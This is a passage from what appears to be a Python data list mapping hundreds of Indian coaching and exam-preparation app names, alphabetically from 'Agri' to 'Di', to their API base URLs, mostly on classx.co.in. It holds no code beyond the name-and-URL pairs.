    ("Agricoaching", "https://agricoachingapi.classx.co.in"),
    ("Agricultureacademyjaipur", "https://agricultureacademyjaipurapi.classx.co.in"),
    ("Agricultureadda", "https://agricultureaddaapi.classx.co.in"),
    ("Agricultureexpert", "https://agricultureexpertapi.classx.co.in"),
    ("Agriculturegk", "https://agriculturegkapi.classx.co.in"),
    ("Agriculturepadhaiexamprep", "https://agriculturepadhaiexamprepapi.classx.co.in"),
    ("Agrieducators", "https://agrieducatorsapi.classx.co.in"),
    ("Agriexamlibrary", "https://agriexamlibraryapi.classx.co.in"),
    ("Agrimentors", "https://agrimentorsapi.classx.co.in"),
    ("Agrimshiksha", "https://agrimshikshaapi.classx.co.in"),
    ("Agripathclassesudaipur", "https://agripathclassesudaipurapi.classx.co.in"),
    ("Agripmfqualityagriculture", "https://agripmfqualityagricultureapi.classx.co.in"),
    ("Agripowerjaipurcoaching", "https://agripowerjaipurcoachingapi.classx.co.in"),
    ("Agrirevolution", "https://agrirevolutionapi.classx.co.in"),
    ("Agriselectionpoint", "https://agriselectionpointapi.classx.co.in"),
    ("Agritubeplus", "https://agritubeplusapi.classx.co.in"),
    ("Agriyug", "https://agriyugapi.classx.co.in"),
    ("Agrizoneclasses", "https://agrizoneclassesapi.classx.co.in"),
    ("Aiapgetpocketapp", "https://aiapgetpocketappapi.classx.co.in"),
    ("Aifmeducation", "https://aifmeducationapi.classx.co.in"),
    ("Aimers", "https://aimersapi.classx.co.in"),
    ("Aimersacademy", "https://aimersacademyapi.classx.co.in"),
    ("Aiminghigh", "https://aiminghighapi.classx.co.in"),
    ("Ajaybeniwalmaths", "https://ajaybeniwalmathsapi.classx.co.in"),
    ("Ajaygurukul", "https://ajaygurukulapi.classx.co.in"),
    ("Ajaynyolmathematics", "https://ajaynyolmathematicsapi.classx.co.in"),
    ("Ajitchahalschallengersacademy", "https://ajitchahalchallengersacademyapi.classx.co.in"),
    ("Akashlectureonline", "https://akashlectureonlineapi.classx.co.in"),
    ("Akashtalks", "https://akashtalksapi.classx.co.in"),
    ("Akb", "https://akbpublicationeducationapi.classx.co.in"),
    ("Akdubeytutorials", "https://akdubeytutorialsapi.classx.co.in"),
    ("Akeduspot", "https://akeduspotapi.classx.co.in"),
    ("Akengineeringacademy", "https://akengineeringacademyapi.classx.co.in"),
    ("Akfoundation", "https://akfoundationapi.classx.co.in"),
    ("Akihimselfschoolofmusic", "https://akihimselfschoolmusicapi.classx.co.in"),
    ("Aksgroup", "https://aksgroupapi.classx.co.in"),
    ("Akshaybhise", "https://akshaybhiseapi.classx.co.in"),
    ("Akstechnicalclasses", "https://akstechnicalclassesapi.classx.co.in"),
    ("Akstudy", "https://akstudyapi.classx.co.in"),
    ("Alakclasses", "https://alakclassesapi.classx.co.in"),
    ("Alkamedicalclasses", "https://alkamedicalclassesapi.classx.co.in"),
    ("Allexamadda", "https://allexamaddaapi.classx.co.in"),
    ("Allexamguru", "https://allexamguruapi.classx.co.in"),
    ("Allexamlive", "https://allexamapi.classx.co.in"),
    ("Allexamplace", "https://allexamplaceapi.classx.co.in"),
    ("Allfintalk", "https://allfintalkapi.classx.co.in"),
    ("Alliedias", "https://alliediasapi.classx.co.in"),
    ("Allindiafoundation", "https://allindiafoundationapi.classx.co.in"),
    ("Alltimetoppers", "https://alltimetoppersapi.classx.co.in"),
    ("Aloft", "https://aloftpreparationapi.classx.co.in"),
    ("Alphainstitutepro", "https://alphainstituteproapi.classx.co.in"),
    ("Alphaplus", "https://alphaplusapi.classx.co.in"),
    ("Alphaspokenenglish", "https://alphaspokenenglishapi.classx.co.in"),
    ("Amajawan", "https://amajawanapi.classx.co.in"),
    ("Amanpathshala", "https://amanpathshalaapi.classx.co.in"),
    ("Amansir", "https://amansirenglishapi.classx.co.in"),
    ("Amarnadhsirclasses", "https://amarnadhsirclassesapi.classx.co.in"),
    ("Amazoncampus", "https://amazoncampusapi.classx.co.in"),
    ("Amitsacademy", "https://amitsacademyapi.classx.co.in"),
    ("Amitsilani", "https://amitsilaniapi.classx.co.in"),
    ("Amittaldamentorship", "https://amittaldamentorshipapi.classx.co.in"),
    ("Amlearning", "https://amlearningapi.classx.co.in"),
    ("Amolandhalea2Talk", "https://amolandhalea2talkapi.classx.co.in"),
    ("Amolpatil", "https://amolpatilapi.classx.co.in"),
    ("Amolpatilmathsreasoning", "https://amolpatilmathsreasoningapi.classx.co.in"),
    ("Ampledigital", "https://ampledigitalapi.classx.co.in"),
    ("Amplitudeclassesjaipur", "https://amplitudeclassesjaipurapi.classx.co.in"),
    ("Amruthaiasacademy", "https://amruthaiasacademyapi.classx.co.in"),
    ("Amsacademy", "https://amsacademyapi.classx.co.in"),
    ("Analysiseclasses", "https://analysiseclassesapi.classx.co.in"),
    ("Analystias", "https://analystiasapi.classx.co.in"),
    ("Analyticaledupointlive", "https://analyticaledupointliveapi.classx.co.in"),
    ("Angelacademy", "https://angelacademyapi.classx.co.in"),
    ("Angrezimitra", "https://angrezimitraapi.classx.co.in"),
    ("Anilsacademy", "https://anilsacademyapi.classx.co.in"),
    ("Anilsiriti", "https://anilsiritiapi.classx.co.in"),
    ("Animateme", "https://animatemeapi.classx.co.in"),
    ("Anjaneyacademy", "https://anjaneyacademyapi.classx.co.in"),
    ("Ankitsingh", "https://ankitsinghapi.classx.co.in"),
    ("Ankuramtv", "https://ankuramtvapi.classx.co.in"),
    ("Ankurias", "https://ankuriasapi.classx.co.in"),
    ("Annadatabydrrschoudhary", "https://annadatadrrschoudharyapi.classx.co.in"),
    ("Anrlogics", "https://anrlogicsapi.classx.co.in"),
    ("Anugrahaacademy", "https://anugrahaacademyapi.classx.co.in"),
    ("Anuragtyagiclasses", "https://anuragtyagiclassesapi.classx.co.in"),
    ("Anushasanclasseswhiteboardacademy", "https://anushasanclassesapi.classx.co.in"),
    ("Anushastudycentre", "https://anushastudycentreapi.classx.co.in"),
    ("Anveshangroup", "https://anveshangroupapi.classx.co.in"),
    ("Apexartsacademy", "https://apexartsacademyapi.classx.co.in"),
    ("Apexgpat", "https://apexgpatapi.classx.co.in"),
    ("Apinstitute", "https://apinstituteapi.classx.co.in"),
    ("Apnaambition", "https://apnaambitionapi.classx.co.in"),
    ("Apnanotes", "https://apnanotesapi.classx.co.in"),
    ("Apnavidyalaya", "https://apnavidyalayaapi.classx.co.in"),
    ("Apnipathsala", "https://apnipathshalaapi.classx.co.in"),
    ("Apnischool", "https://apnischoolapi.classx.co.in"),
    ("Apnishiksha", "https://apnishikshaapi.classx.co.in"),
    ("Apniuniversity", "https://apniuniversityapi.classx.co.in"),
    ("Appsc", "https://appscapi.classx.co.in"),
    ("Appxhybrid", "https://appxhybridapi.classx.co.in"),
    ("Appxstore", "https://appxstoreapi.classx.co.in"),
    ("Arex", "https://arexapi.classx.co.in"),
    ("Armystudy", "https://armystudyliveclassesapi.classx.co.in"),
    ("Arnavsir", "https://arnavsirapi.classx.co.in"),
    ("Arresearchpoint", "https://arresearchpointapi.classx.co.in"),
    ("Arshacademy", "https://arshacademyapi.classx.co.in"),
    ("Artshala", "https://artshalaapi.classx.co.in"),
    ("Arunstudies", "https://arunstudiesapi.classx.co.in"),
    ("Aryaninstitute", "https://aryaninstituteapi.classx.co.in"),
    ("Aryen", "https://aryenapi.classx.co.in"),
    ("Asaeducation", "https://asaeducationapi.classx.co.in"),
    ("Asastuti", "https://asastutiapi.classx.co.in"),
    ("Aseclive", "https://asecliveapi.classx.co.in"),
    ("Ashaacademy", "https://ashaacademyapi.classx.co.in"),
    ("Ashavahi", "https://ashavahiapi.classx.co.in"),
    ("Ashishsingh", "https://ashishsinghlecturesapi.teachx.in"),
    ("Ashishsinghlecturespro", "https://ashishsinghlecturesapi.classx.co.in"),
    ("Ashishsirphysics", "https://ashishsirphysicsapi.classx.co.in"),
    ("Ashokacivilservices", "https://ashokacivilservicesapi.classx.co.in"),
    ("Ashokagyanguru", "https://ashokagyanguruapi.classx.co.in"),
    ("Ashokaonlineclasses", "https://ashokaonlineclassesapi.classx.co.in"),
    ("Ashokatheexamguru", "https://ashokaexamguruapi.classx.co.in"),
    ("Ashoktechhub", "https://ashoktechhubapi.classx.co.in"),
    ("Ashwinclasses", "https://ashwinclasseslucknowapi.classx.co.in"),
    ("Ashwinpandey", "https://ashwinpandeyapi.classx.co.in"),
    ("Asiannursingacademy", "https://asiannursingacademyapi.classx.co.in"),
    ("Aspectvision", "https://aspectvisionapi.classx.co.in"),
    ("Aspirantjunction", "https://aspirantjunctionapi.classx.co.in"),
    ("Aspirantslive", "https://aspirantsliveapi.classx.co.in"),
    ("Aspirationstudycentre", "https://aspirationstudycentreapi.classx.co.in"),
    ("Aspiredefence", "https://aspiredefenceapi.classx.co.in"),
    ("Aspiringteachers20", "https://aspiringteachersapi.classx.co.in"),
    ("Asrocareers", "https://asrocareersapi.classx.co.in"),
    ("Assamedu", "https://assameduapi.classx.co.in"),
    ("Astechnic", "https://astechnicapi.classx.co.in"),
    ("Asthaias", "https://asthaiasacademyapi.classx.co.in"),
    ("Astitvaacademy", "https://astitvaacademyapi.classx.co.in"),
    ("Astroaauraworld", "https://astroaauraworldapi.classx.co.in"),
    ("Atfirsttechnologies", "https://atfirsttechnologiesapi.classx.co.in"),
    ("Atharvaaggarwalofficial", "https://atharvaagarwalapi.classx.co.in"),
    ("Atstudycentre", "https://atstudycentreapi.classx.co.in"),
    ("Atulyalokmanch", "https://atulyalokmanchapi.classx.co.in"),
    ("Augustulearning", "https://augustulearningapi.classx.co.in"),
    ("Aveducationalacademy", "https://aveducationalacademyapi.classx.co.in"),
    ("Avinashparandeshirurpattern", "https://avinashparandeshirurpatternapi.classx.co.in"),
    ("Avinashsharma", "https://avinashsharmaapi.classx.co.in"),
    ("Avishkaracademy", "https://avishkaracademyapi.classx.co.in"),
    ("Avp", "https://avpapi.classx.co.in"),
    ("Avp247", "https://avp247api.classx.co.in"),
    ("Awstrainingcenter", "https://awstrainingcenterapi.classx.co.in"),
    ("Ayurprashna", "https://ayurprashnaapi.classx.co.in"),
    ("Ayurvedabeingvaidya", "https://ayurvedabeingvaidyaapi.classx.co.in"),
    ("Ayurvedalibrary", "https://ayurvedalibraryapi.classx.co.in"),
    ("Ayurvedapocketapp", "https://ayurvedapocketappapi.classx.co.in"),
    ("Ayurvedaprakrutivikruti", "https://ayurvedaprakrutivikrutiapi.classx.co.in"),
    ("Azadiasacademy", "https://azadiasacademyapi.classx.co.in"),
    ("Azucation", "https://azucationapi.classx.co.in"),
    ("Babhopalacademy", "https://babhopalacademyapi.classx.co.in"),
    ("Backtoeducation", "https://backeducationapi.classx.co.in"),
    ("Badamsinghclasses", "https://badamsinghclassesapi.classx.co.in"),
    ("Badesirclasses", "https://badesirclassesapi.classx.co.in"),
    ("Balasahebbhilareacademy", "https://balasahebbhilareacademyapi.classx.co.in"),
    ("Baluiq", "https://baluiqapi.classx.co.in"),
    ("Bandhanpathshala", "https://bandhanpathshalaapi.classx.co.in"),
    ("Bankerspoint", "https://bankerspointapi.classx.co.in"),
    ("Bankerspointmaharashtra", "https://bankerspointmaharastraapi.classx.co.in"),
    ("Bankerszoneapp", "https://bankerszoneappapi.classx.co.in"),
    ("Bansallive", "https://bansalliveapi.classx.co.in"),
    ("Basarainstitute", "https://basarainstituteapi.classx.co.in"),
    ("Basicsiksha", "https://basicsikshaapi.classx.co.in"),
    ("Bbaacademy", "https://bbaacademyapi.classx.co.in"),
    ("Bbcstudy", "https://bbcstudyapi.classx.co.in"),
    ("Bbn", "https://bbnapi.classx.co.in"),
    ("Be10X", "https://be10xapi.classx.co.in"),
    ("Beastlearners", "https://beastlearnersapi.classx.co.in"),
    ("Beatexams", "https://beatexamsapi.classx.co.in"),
    ("Bebankersanreetiacademy", "https://bebankerapi.classx.co.in"),
    ("Beeclassesbyghogaresir", "https://beeclassesbyghogaresirapi.classx.co.in"),
    ("Beepublication", "https://beepublicationapi.classx.co.in"),
    ("Beetaacademy", "https://beetaacademyapi.classx.co.in"),
    ("Beforebiology", "https://beforebiologyapi.classx.co.in"),
    ("Beingaspirant", "https://beingaspirantapi.classx.co.in"),
    ("Beingdoctor", "https://beingdoctorapi.classx.co.in"),
    ("Beparwahiacademy", "https://beparwahiacademyapi.classx.co.in"),
    ("Bepecexperiencetherealtime", "https://bepecexperiencerealtimeapi.classx.co.in"),
    ("Bestacad", "https://bestacadapi.classx.co.in"),
    ("Betterenroll", "https://betterenrollapi.classx.co.in"),
    ("Bhagirathiasacademy", "https://bhagirathiasacademyapi.classx.co.in"),
    ("Bhambhusirhindi", "https://bhambhusirhindiapi.classx.co.in"),
    ("Bharariacademy", "https://bharariacademyapi.classx.co.in"),
    ("Bharatiasacademy", "https://bharatiasacademyapi.classx.co.in"),
    ("Bharatjobs", "https://bharatjobsapi.classx.co.in"),
    ("Bharatsikshaacademy", "https://bharatsikshaacademyapi.classx.co.in"),
    ("Bharti", "https://bhartilearningapi.appx.co.in"),
    ("Bhashmiacademy", "https://bhashmiacademyapi.classx.co.in"),
    ("Bhavishyaacademy", "https://bhavishyaacademyapi.classx.co.in"),
    ("Bhavishyabhartiranchi", "https://bhavishyabhartiranchiapi.classx.co.in"),
    ("Bhavyainstitution", "https://bhavyainstitutionapi.classx.co.in"),
    ("Bhawanisinghchundawathindi", "https://bhawanisinghchundawathindiapi.classx.co.in"),
    ("Bhualumnismartsolution", "https://bhualumnismartsolutionapi.classx.co.in"),
    ("Bhupendrasinghdinkar", "https://bhupendrasinghdinkarapi.classx.co.in"),
    ("Bhushanmpscacademy", "https://bhushanmpscacademyapi.classx.co.in"),
    ("Bicebiswasinstitute", "https://bicebiswasinstituteapi.classx.co.in"),
    ("Big20", "https://big20appapi.classx.co.in"),
    ("Bigbangbogan", "https://bigbangboganapi.classx.co.in"),
    ("Biharboardeducation", "https://biharboardeducationapi.classx.co.in"),
    ("Biharsmartclasses", "https://biharsmartclassesapi.classx.co.in"),
    ("Biologyinhindi", "https://biologyinhindiapi.classx.co.in"),
    ("Biplawstudycentrebsc", "https://biplawstudycentreapi.classx.co.in"),
    ("Birensirodia", "https://birensirodiaapi.classx.co.in"),
    ("Biswaniclasses", "https://biswaniclassesapi.classx.co.in"),
    ("Bitsyuva", "https://bitsyuvaapi.classx.co.in"),
    ("Bookmyvideo", "https://bookmyvideoapi.classx.co.in"),
    ("Bookrox", "https://bookroxapi.classx.co.in"),
    ("Bookup", "https://bookupapi.classx.co.in"),
    ("Bookwormacademy", "https://bookwormacademyapi.classx.co.in"),
    ("Boosteracademy", "https://boosteracademyapi.classx.co.in"),
    ("Bpnmath", "https://bpnmathapi.classx.co.in"),
    ("Bpscacademy", "https://bpscacademyapi.classx.co.in"),
    ("Bpscadda247", "https://bpscadda247api.classx.co.in"),
    ("Bpscscore", "https://bpscscoreapi.classx.co.in"),
    ("Bpsczone", "https://bpsczoneapi.classx.co.in"),
    ("Brahmasmi", "https://brahmasmiapi.classx.co.in"),
    ("Brahmieducation", "https://brahmieducationapi.classx.co.in"),
    ("Brainbulb", "https://brainbulbapi.classx.co.in"),
    ("Brainerygroupvod", "https://brainerygroupvodapi.classx.co.in"),
    ("Brainq", "https://brainqapi.classx.co.in"),
    ("Brclasses", "https://brclassesapi.classx.co.in"),
    ("Brightacademy", "https://brightacademyapi.classx.co.in"),
    ("Brightpublication", "https://brightpublicationapi.classx.co.in"),
    ("Brilliantcommerceclassespune", "https://brilliantcommerceclassespuneapi.classx.co.in"),
    ("Brilliantguru", "https://brilliantguruapi.classx.co.in"),
    ("Brillianttestseries", "https://brillianttestseriesapi.classx.co.in"),
    ("Brotherhooddefence", "https://brotherhooddefenceapi.classx.co.in"),
    ("Bsclearningapp", "https://bsclearningappapi.classx.co.in"),
    ("Bscproclasses", "https://bscproclassesapi.classx.co.in"),
    ("Bscwithrambabusir", "https://bscrambabusirapi.classx.co.in"),
    ("Bsgurukul", "https://bsgurukulapi.classx.co.in"),
    ("Bsppharmacyofficial", "https://bsppharmacyapi.classx.co.in"),
    ("Bualbuleslive", "https://bualbulesliveapi.classx.co.in"),
    ("Bumbexfull", "https://bumbexfullapi.classx.co.in"),
    ("Bypradipbodhale", "https://paripurnmarathivyakaranapi.classx.co.in"),
    ("Bystudy", "https://bystudyapi.classx.co.in"),
    ("Cadetsdefencacademy", "https://cadetsdefenceacademyapi.classx.co.in"),
    ("Cadetspointlearningapp", "https://cadetspointlearningappapi.classx.co.in"),
    ("Canonline", "https://canonlineapi.classx.co.in"),
    ("Canvasclasses", "https://canvasclassesapi.classx.co.in"),
    ("Capfacmentors", "https://capfacmentorsapi.classx.co.in"),
    ("Caramanluthraclasses", "https://caramanluthraclassesapi.classx.co.in"),
    ("Carbacademy", "https://carbacademyapi.classx.co.in"),
    ("Careerado", "https://careeradoapi.classx.co.in"),
    ("Careerbooster", "https://careerboosterapi.classx.co.in"),
    ("Careerclassesjaipur", "https://careerclassesjaipurapi.classx.co.in"),
    ("Careerhub", "https://careerhubapi.classx.co.in"),
    ("Careermirror", "https://careermirrorapi.classx.co.in"),
    ("Careernow", "https://careernowapi.classx.co.in"),
    ("Careerstudy", "https://careerstudyapi.classx.co.in"),
    ("Careerupdatebyengineer", "https://careerupdatebyengineerapi.classx.co.in"),
    ("Careerupshillong", "https://careerupshillongapi.classx.co.in"),
    ("Careervijay", "https://careervijayapi.classx.co.in"),
    ("Careerwave", "https://careerwaveapi.classx.co.in"),
    ("Careerwin", "https://careerwinapi.classx.co.in"),
    ("Careerwitharun", "https://careerarunapi.classx.co.in"),
    ("Carrierkatta", "https://carrierkattaapi.classx.co.in"),
    ("Casepage", "https://casepageapi.classx.co.in"),
    ("Catalystsoni", "https://catalystsoniapi.classx.co.in"),
    ("Cayatra", "https://cayatraapi.classx.co.in"),
    ("Cccwifistudy", "https://cccwifistudyapi.classx.co.in"),
    ("Cdacareerdishariacademy", "https://cdacareerdishariacademyapi.classx.co.in"),
    ("Cdacpreparation", "https://cdacpreparationapi.classx.co.in"),
    ("Cdpmastilearningapp", "https://cdpmastilearningappapi.classx.co.in"),
    ("Ceadclasses", "https://ceadclassesapi.classx.co.in"),
    ("Centuriondefenceacademy", "https://centuriondefenceacademyapi.classx.co.in"),
    ("Centurionstudypoint", "https://centurionstudypointapi.classx.co.in"),
    ("Cetqualifiers", "https://cetqualifiersapi.classx.co.in"),
    ("Cgpscknowledgehubpscwala", "https://cgpscknowledgehubapi.classx.co.in"),
    ("Cgpscmapology", "https://cgpscmapologyapi.classx.co.in"),
    ("Cgpscwiseup", "https://cgpscwiseupapi.classx.co.in"),
    ("Chaloseekho", "https://chaloseekhoapi.classx.co.in"),
    ("Champcircle", "https://champcircleapi.classx.co.in"),
    ("Championsiitmedical", "https://championsiitmedicalapi.classx.co.in"),
    ("Champsacademy", "https://champsacademyapi.classx.co.in"),
    ("Champsclassesprepjeet", "https://champsclassesapi.classx.co.in"),
    ("Chanakyachamps", "https://chanakyachampsapi.classx.co.in"),
    ("Chanakyadefenceacademy", "https://chanakyadefenceacademyapi.classx.co.in"),
    ("Chanakyaphysicalacademy", "https://chanakyaphysicalacademyapi.classx.co.in"),
    ("Chandanclasses", "https://chandanclassesapi.classx.co.in"),
    ("Chandanlogic", "https://newchandanlogicsapi.classx.co.in"),
    ("Chandanmishrabusinesscoach", "https://chandanmishrabusinesscoachapi.classx.co.in"),
    ("Chankshyamandalforupscandmpsc", "https://chankshyamandalupscmpscapi.classx.co.in"),
    ("Charikrishnasirclasses", "https://charikrishnasirclassesapi.classx.co.in"),
    ("Charteredcommerce", "https://charteredcommerceapi.classx.co.in"),
    ("Chauhanlawacademy", "https://chauhanlawacademyapi.classx.co.in"),
    ("Chemacademy", "https://chemacademyapi.classx.co.in"),
    ("Chemistrybyanilsir", "https://chemistryanilsirapi.classx.co.in"),
    ("Chemistryforyou", "https://chemistryforyouapi.classx.co.in"),
    ("Chemistryguruji", "https://chemistrygurujiapi.classx.co.in"),
    ("Chemistrypro", "https://chemistryproapi.classx.co.in"),
    ("Chemistrywallahvvr", "https://chemistrywallahvvrapi.classx.co.in"),
    ("Chemphy", "https://chemphyapi.classx.co.in"),
    ("Chengdedohipode", "https://chengdedohipodeapi.classx.co.in"),
    ("Chhoteiasthelearningapp", "https://chhoteiaslearningapi.classx.co.in"),
    ("Chinmayacademy", "https://chinmayacademyapi.classx.co.in"),
    ("Chiralacademy", "https://chiralacademyapi.classx.co.in"),
    ("Choutiseconomy", "https://choutiseconomyapi.classx.co.in"),
    ("Chrisedutech", "https://chrisedutechapi.classx.co.in"),
    ("Christopher", "https://christopherapi.classx.co.in"),
    ("Chunchunstudyacademy", "https://chunchunstudyacademyapi.classx.co.in"),
    ("Cityeducation", "https://cityeducationapi.classx.co.in"),
    ("Civilanalystcareer", "https://civilanalystcareerapi.classx.co.in"),
    ("Civilservices", "https://studycivilservicesapi.classx.co.in"),
    ("Civilsguruias", "https://civilsguruiasapi.classx.co.in"),
    ("Civiltaiyari", "https://civiltaiyariapi.classx.co.in"),
    ("Civiltechsolution", "https://civiltechsolutionapi.classx.co.in"),
    ("Cjclasses", "https://cjclassesapi.classx.co.in"),
    ("Clarifyknowledge", "https://clarifyknowledgeapi.classx.co.in"),
    ("Class24Byparwezsir", "https://class24parwezsirapi.classx.co.in"),
    ("Classhour", "https://classhourapi.classx.co.in"),
    ("Classtest", "https://classtestappxapi.classx.co.in"),
    ("Clatiansaguideforlawaspirants", "https://clatiansapi.classx.co.in"),
    ("Clearvisionclasses", "https://clearvisionclassesapi.classx.co.in"),
    ("Cloudtech", "https://cloudtechapi.classx.co.in"),
    ("Cmccareer", "https://cmccareerapi.classx.co.in"),
    ("Cmcindore", "https://cmcindoreapi.classx.co.in"),
    ("Cmpforupscmpsc", "https://chanakyamandalpariwarapi.classx.co.in"),
    ("Cnachievers", "https://cnachieversapi.classx.co.in"),
    ("Cnreddyacademy", "https://cnreddyacademyapi.classx.co.in"),
    ("Coachify", "https://coachifyapi.classx.co.in"),
    ("Coachingwithradhesir", "https://coachingradhesirapi.classx.co.in"),
    ("Coceducation", "https://coceducationapi.classx.co.in"),
    ("Codegenie", "https://codegenieapi.classx.co.in"),
    ("Codewithanurag", "https://codewithanuragapi.classx.co.in"),
    ("Codewithashhad", "https://codeashhadapi.classx.co.in"),
    ("Codingcontentcreator", "https://codingcontentcreatorapi.classx.co.in"),
    ("Codingseekho", "https://codingseekhoapi.classx.co.in"),
    ("Codingwallahsir", "https://codingwallahsirapi.classx.co.in"),
    ("Combinecrux", "https://combinecruxapi.classx.co.in"),
    ("Commerceassetsinstitute", "https://commerceassetsinstituteapi.classx.co.in"),
    ("Commerceinsightselearning", "https://commerceinsightselearningapi.classx.co.in"),
    ("Commercenation", "https://commercenationapi.classx.co.in"),
    ("Commercenationpro", "https://commercenationproapi.classx.co.in"),
    ("Commercewaleguruji", "https://commercewalegurujiapi.classx.co.in"),
    ("Commercewithvinay", "https://commercevinayapi.classx.co.in"),
    ("Competishun", "https://competishunapi.classx.co.in"),
    ("Competitionacademydigitalclasses", "https://competitionacademydigitalclassesapi.classx.co.in"),
    ("Competitionguru", "https://competitionguruapi.classx.co.in"),
    ("Competitionmaterialharyana", "https://competitionmaterialharayanaapi.classx.co.in"),
    ("Competitionmathpoint", "https://competitionmathpointapi.classx.co.in"),
    ("Competitionprobymkmishra", "https://competitionpromkmishraapi.classx.co.in"),
    ("Competitivepharma", "https://competitivepharmaapi.classx.co.in"),
    ("Computech", "https://computechapi.classx.co.in"),
    ("Comrcio", "https://comercioapi.classx.co.in"),
    ("Conceptclaritywala", "https://conceptclaritywalaapi.classx.co.in"),
    ("Conceptclasses", "https://conceptclassesapi.classx.co.in"),
    ("Conceptseekho", "https://conceptseekhoapi.classx.co.in"),
    ("Conceptup", "https://conceptupapi.classx.co.in"),
    ("Constantguide", "https://constantguideapi.classx.co.in"),
    ("Cosmosclasses", "https://cosmosclassesapi.classx.co.in"),
    ("Cosmossikaraninstituteofgeography", "https://cosmossikarapi.classx.co.in"),
    ("Coursee", "https://courseeapi.classx.co.in"),
    ("Cpyadavclasses", "https://cpyadavclassesapi.classx.co.in"),
    ("Crackcuetexam", "https://crackcuetexamapi.classx.co.in"),
    ("Crackerexamhub", "https://crackerexamhubapi.classx.co.in"),
    ("Crackexampurvi", "https://crackexampurviapi.classx.co.in"),
    ("Crackparikshachandanlogicsold", "https://chandanlogicsapi.classx.co.in"),
    ("Crackvision", "https://crackvisionapi.classx.co.in"),
    ("Createu", "https://createuapi.classx.co.in"),
    ("Creativechemistry", "https://creativechemistryapi.classx.co.in"),
    ("Creativecomputer", "https://creativecomputerapi.classx.co.in"),
    ("Crisscrossclasses", "https://crisscrossclassesapi.classx.co.in"),
    ("Cropcosagriedutech", "https://cropcosagriapi.classx.co.in"),
    ("Csacivilservicesacademy", "https://civilservicesacademyapi.classx.co.in"),
    ("Csatbykabirsir", "https://csatkabirsirapi.classx.co.in"),
    ("Csclassroom", "https://csclassroomapi.classx.co.in"),
    ("Csmaths", "https://csmathsapi.classx.co.in"),
    ("Cstutorugcnetgyan", "https://cstutorapi.classx.co.in"),
    ("Ctcclasses", "https://ctcclassesapi.classx.co.in"),
    ("Cuetechratneshpandey", "https://cuetechapi.classx.co.in"),
    ("Cuetprep", "https://cuetprepapi.classx.co.in"),
    ("Currentaffairsbyshrikanttayade", "https://currentaffairsbyshrikanttayadeapi.classx.co.in"),
    ("D2Techlab", "https://d2techlabapi.classx.co.in"),
    ("Dabrasirscience", "https://dabrasirscienceapi.classx.co.in"),
    ("Dagdushethupscacademy", "https://dagdushethupscacademyapi.classx.co.in"),
    ("Dagur", "https://daguracademyapi.teachx.in"),
    ("Dagursacademy", "https://daguracademyapi.classx.co.in"),
    ("Dailypractice", "https://dailypracticeapi.classx.co.in"),
    ("Darshanikias", "https://darshanikiasapi.classx.co.in"),
    ("Dazzlingcareer", "https://dazzlingcareerapi.classx.co.in"),
    ("Dbmcimdslive", "https://dbmcimdsliveapi.classx.co.in"),
    ("Dbstudyhub", "https://dbstudyhubapi.classx.co.in"),
    ("Dccinstitute", "https://dccinstituteapi.classx.co.in"),
    ("Dcclasses", "https://dcclassesapi.classx.co.in"),
    ("Dcjantabysarvantsir", "https://dcjantasarvantsirapi.classx.co.in"),
    ("Deargurujiofficial", "https://gurujiofficialapi.classx.co.in"),
    ("Dearlearners", "https://dearlearnersapi.classx.co.in"),
    ("Dearsirbarisir", "https://dearsirbarisirapi.classx.co.in"),
    ("Deccanias", "https://deccaniasapi.classx.co.in"),
    ("Decodingsports", "https://decodingsportsapi.classx.co.in"),
    ("Deebha", "https://deebhaapi.classx.co.in"),
    ("Deepakclasses", "https://deepakclassesapi.classx.co.in"),
    ("Deepakeducationhub", "https://deepakeducationhubapi.classx.co.in"),
    ("Deepeducation", "https://deepeducationapi.classx.co.in"),
    ("Deepikaclasses", "https://deepikaclassesapi.classx.co.in"),
    ("Deeptisinghacademy", "https://deeptisinghacademyapi.classx.co.in"),
    ("Defencedarling", "https://defencedarlingapi.classx.co.in"),
    ("Defencefighter", "https://defencefighterapi.classx.co.in"),
    ("Defencemania", "https://defencemania2api.classx.co.in"),
    ("Defencesadhanacdscapfacndaafcat", "https://defencesadhanaapi.classx.co.in"),
    ("Defencezonekanpur", "https://defencezoneapi.classx.co.in"),
    ("Degreemathstutorialdmtlogics", "https://degreemathstutorialapi.classx.co.in"),
    ("Dehradunclasses", "https://dehradunclassesapi.classx.co.in"),
    ("Delhipoliceconstable2023", "https://delhipoliceconstableapi.classx.co.in"),
    ("Delhisecrets", "https://delhisecretsapi.classx.co.in"),
    ("Deserveias", "https://deserveiasapi.classx.co.in"),
    ("Desiretolearn", "https://desiretolearnapi.classx.co.in"),
    ("Destinationias", "https://destinationiasapi.classx.co.in"),
    ("Devgktricks", "https://devgktricksapi.classx.co.in"),
    ("Dfglory", "https://dfgloryapi.classx.co.in"),
    ("Dgscaps", "https://dgscapsapi.classx.co.in"),
    ("Dhaapps", "https://dhaappsapi.classx.co.in"),
    ("Dhakadcoachingrameshwarsir", "https://dhakadcoachingrameshwarsirapi.classx.co.in"),
    ("Dhakadconcept", "https://dhakadconceptapi.classx.co.in"),
    ("Dhananjayias", "https://dhananjayiasacademyapi.classx.co.in"),
    ("Dhanbadmathsacademy", "https://dhanbadmathsacademyapi.classx.co.in"),
    ("Dhangarchemistrylecturepro", "https://dhangarchemistrylectureproapi.classx.co.in"),
    ("Dhankharclasses", "https://dhankharclassesapi.classx.co.in"),
    ("Dharmendrasociology", "https://dharmendrasociologyapi.classx.co.in"),
    ("Dharoharclasses", "https://dharoharclassesapi.classx.co.in"),
    ("Dharteeeducation", "https://dharteeeducationapi.classx.co.in"),
    ("Dhasusir", "https://dhasusiracademyapi.teachx.in"),
    ("Dhasusiracademy", "https://dhasusiracademyapi.classx.co.in"),
    ("Dhaygudeacademy", "https://dhaygudeacademysataraapi.classx.co.in"),
    ("Dheyapurtifoundation", "https://dheyapurtifoundationapi.classx.co.in"),
    ("Dhoraclasses", "https://dhoraclassesapi.classx.co.in"),
    ("Dhyeyinstitute", "https://dhyeyinstituteapi.classx.co.in"),
    ("Dhyeyliveapplication", "https://dhyeyliveapplicationapi.classx.co.in"),
    ("Diacmpscfullcourses", "https://diacmpscfullcoursesapi.classx.co.in"),
    ("Dictionenglishclasses", "https://dictionenglishclassesapi.classx.co.in"),
    ("Digicateias", "https://digicateiasapi.classx.co.in"),
    ("Digilearn", "https://digilearnapi.classx.co.in"),
    ("Diginest", "https://diginestapi.classx.co.in"),
    ("Digitech", "https://digitechapi.classx.co.in"),
    ("Digvijaysirgs", "https://digvijaysirgsapi.classx.co.in"),
    ("Dikshantias", "https://dikshantiasapi.classx.co.in"),
